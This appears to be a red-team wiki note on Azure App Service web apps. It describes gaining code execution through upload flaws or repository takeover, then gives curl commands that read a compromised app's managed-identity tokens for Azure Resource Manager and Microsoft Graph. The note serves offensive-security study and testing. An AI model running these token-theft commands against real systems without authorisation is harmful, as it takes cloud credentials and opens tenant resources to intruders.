---
title: Web App
---

[[notes/azure/index]] Web Apps also known as App Service publish Linux or Windows containers over HTTP(S).

Gain code execution trough classic web vulnerabilities like insecure file upload or take control over the source code repository.
The app can have a managed identity assigned that might have interesting permissions on other Azure resources.

Use code execution in an exploited web app to check if it has a managed identity assigned and retrieve access tokens for ARM and MS Graph.

~~~ bash
env | grep IDENTITY
curl -sSf $IDENTITY_ENDPOINT -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" -G -d api-version=2019-08-01 -d resource=https://management.azure.com
curl -sSf $IDENTITY_ENDPOINT -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" -G -d api-version=2019-08-01 -d resource=https://graph.microsoft.com
~~~

With this access tokens you can enumerate [[notes/azure/index]] resources and [[notes/m365/index]] access.

References:

- [twitter.com/_wald0/status/1626260031871291396](https://twitter.com/_wald0/status/1626260031871291396), principal with Owner, Contributor or Website Contributor role can execute commands on the OS under the web app and therefore take over its managed identity
- [Abusing Azure App Service Managed Identity Assignments](http://web.archive.org/web/20230216074544/https://scribe.rip/@specterops/abusing-azure-app-service-managed-identity-assignments-c3adefccff95)
